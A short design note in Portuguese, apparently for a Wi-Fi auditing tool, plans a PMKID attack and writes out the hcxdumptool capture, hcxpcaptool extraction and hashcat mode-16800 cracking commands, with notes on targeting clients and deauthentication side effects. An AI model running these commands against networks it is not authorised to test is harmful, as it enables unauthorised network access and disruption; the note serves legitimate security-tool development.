### Ataque PMKID

Veja https://hashcat.net/forum/thread-7717.html

### Passos

1. Iniciar `hcxdumptool` (daemon)
   * `sudo hcxdumptool -i wlan1mon -o pmkid.pcapng -t 10 --enable_status=1`
   * Também deve usar `-c <channel>`, `--filterlist` e `--filtermode` segmentar um cliente específico
   * Pode ser um novo tipo de ataque: `wifite.attack.pmkid`
2. Detectar quando o PMKID for encontrado.
   * `hcxpcaptool -z pmkid.16800 pmkid.pcapng`
   * Linha única em pmkid.16800 terá PMKID, MACAP, MACStation, ESSID (em hexadecimal).
3. Salvar `.16800` arquivo (para `./hs/`? ou `./pmkids/`?)
   * Novo tipo de resultado: `pmkid_result`
   * Adicionar entrada a `cracked.txt`
4. Execute o ataque de crack usando hashcat:
   * `./hashcat64.bin --force -m 16800 -a0 -w2 path/to/pmkid.16800 path/to/wordlist.txt`

### Problemas

* Requer a instalação do hashcat mais recente. Isso pode estar em um diretório diferente.
   * Use pode especificar o caminho para o hashcat? É...
   * % hashcat -h | grep 16800
   * 16800 | WPA-PMKID-PBKDF2
* Se o alvo não puder ser atacado... precisamos detectar este modo de falha.
   * Pode ser necessário raspar a saída do `hcxdumptool`
   * Veja `pmkids()` função em .bashrc
   * hcxpcaptool -z OUTPUT.16800 INPUT.pcapng > /dev/null
   * Verifique OUTPUT.16800 para o ESSID.
* O suporte do adaptador sem fio é mínimo, aparentemente.
* hcxdumptool também deauths redes e captura handshakes... talvez desnecessariamente

